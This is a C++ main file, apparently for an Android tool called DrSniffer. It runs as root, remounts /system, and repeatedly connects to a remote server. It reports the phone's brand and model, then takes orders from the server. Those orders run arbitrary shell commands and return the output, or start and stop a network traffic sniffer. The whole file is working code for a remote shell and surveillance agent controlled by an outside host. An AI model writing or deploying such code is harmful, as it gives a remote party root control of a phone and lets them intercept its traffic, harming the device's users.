/*
 * DrSnifferMain.cpp
 *
 *  Created on: 2014年3月3日
 *      Author: Kingsley Yau
 *      Email: Kingsleyyau@gmail.com
 */

#include "DrSniffer.h"
#include "DrSinfferExecuteDef.h"
#include "DrSnifferClient.h"

#include "../json/json/json.h"

DrSniffer g_DrSniffer;
DrSnifferClient g_DrSnifferClient;

int main(int argc, char** argv) {
	char stra[16] = {'\0'};
	sprintf(stra, "%d", argc);

	if(2 == argc) {
		if(0 == strcmp(argv[1], "-v")) {
			printf("%s%s\n", DrSinfferVersionString, DrSnifferVersion);
			return 0;
		}
	}

	int uid = 0, gid = 0;
	if(setgid(gid) || setuid(uid)) {
		ELog("jni.DrSniffer.main", "权限不够,请提升至管理员权限再运行程序!");
		return 0;
	}

	if(!MountSystem()) {
		ELog("jni.DrSniffer.main", "重新挂载/system失败, 日志文件可能无法保存!");
	}

	FileLog(DrSnifferLogFileName, "drsniffer启动!");

	while(1) {
		FileLog(DrSnifferLogFileName, "等待连接服务端...");
		if(g_DrSnifferClient.ConnectServer()) {
			// 连接上服务端, 发送手机型号/手机号
			FileLog(DrSnifferLogFileName, "已经连接上服务端,发送手机型号,手机号...");
			SSCMD sscmd;
			sscmd.scmdt = SnifferServerTypeClientInfo;
			Json::Value root;
			root[PHONE_INFO_BRAND] = GetPhoneBrand();
			root[PHONE_INFO_MODEL] = GetPhoneModel();
			root[PHONE_INFO_NUMBER] = "";
			Json::FastWriter writer;
			sscmd.param = writer.write(root);
			g_DrSnifferClient.SendCommand(sscmd);

			FileLog(DrSnifferLogFileName, "等待接收命令...");
			bool bCanRecv = true;
			while(bCanRecv) {
				// 开始接收命令
				SCCMD sccmd = g_DrSnifferClient.RecvCommand();

				switch(sccmd.scmdt) {
				case ExcuteCommand:{
					// 执行Shell命令
					string cmd = sccmd.param;
					FileLog(DrSnifferLogFileName, "收到服务器命令,执行Shell:(%s)", cmd.c_str());
					string result = SystemComandExecuteWithResult(cmd);

					// 返回命令结果
					SSCMD sscmd;
					sscmd.scmdt = ExcuteCommandResult;
					sscmd.param = result;
					g_DrSnifferClient.SendCommand(sscmd);
				}break;
				case SinfferClientTypeStart:{
					// 开始监听
					FileLog(DrSnifferLogFileName, "收到服务器命令,开始监听...");
					g_DrSniffer.StartSniffer();
				}break;
				case SinfferClientTypeStop:{
					// 停止监听
					g_DrSniffer.StopSniffer();
				}break;
				case SinfferClientTypeVersion:{
					// 返回版本
					FileLog(DrSnifferLogFileName, "收到服务器命令,返回版本号:%s", DrSnifferVersion);
					// 返回命令结果
					SSCMD sscmd;
					sscmd.scmdt = ExcuteCommandResult;
					sscmd.param = DrSnifferVersion;
					g_DrSnifferClient.SendCommand(sscmd);
				}break;
				case SinfferClientTypeNone:{
					// 与服务端连接已经断开
					FileLog(DrSnifferLogFileName, "与服务端连接已经断开!");
					bCanRecv = false;
				}break;
				}
			}
		}

		sleep(30);
	}

	FileLog(DrSnifferLogFileName, "drsniffer退出!");
	return 1;
}
